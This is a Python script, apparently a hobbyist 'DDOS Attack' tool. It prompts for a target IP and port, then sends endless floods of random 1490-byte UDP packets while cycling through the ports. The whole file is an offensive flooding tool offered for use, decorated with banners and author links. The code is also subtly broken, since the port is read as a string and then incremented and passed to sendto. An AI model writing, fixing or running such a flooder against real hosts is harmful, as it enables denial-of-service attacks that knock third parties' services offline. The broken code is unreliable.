import sys
import os
import time
import socket
import random

from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
yellow = '\033[93m'
grn = '\033[1;92m'
##############
reg = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
load = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDOS Attack | lolcat")
print (yellow + "author      :  ANONYMOUS" + yellow)
print (yellow + "website     :  https://dev-regaanthamimprogramming.pantheonsite.io" + yellow)
print (yellow + "You Tube    :  https://www.youtube.com/channel/UCpKJnmkqAYVqLbl3ZWhh4yA" + yellow)
print (yellow + "github      :  https://github.com/noobforanonymous" + yellow)

rt = input("Enter Your Target IP : ")
hack = input("Enter Any Port       : ")

os.system("clear")
os.system("figlet Attack Started  |  lolcat")
print (grn + "[                    ] wait 0% loading" + grn)
time.sleep(1)
print (grn + "[=====               ] wait 20% loading" + grn)
time.sleep(1)
print (grn + "[========            ] wait 40% loading" + grn)
time.sleep(1)
print (grn + "[============        ] wait 60% loading" + grn)
time.sleep(1)
print (grn + "[===============     ] wait 80% loading" + grn)
time.sleep(1)
print (grn + "[====================] Now 100% Completed to start attacking" + grn)
time.sleep(2)
send = 0
while True:
     reg.sendto(load,(rt,hack))
     send = send + 1
     hack = hack + 1
     print ("sends %s the packet  %s through port:%s"%(send,rt,hack))
     if hack == 65534:
       hack = 1

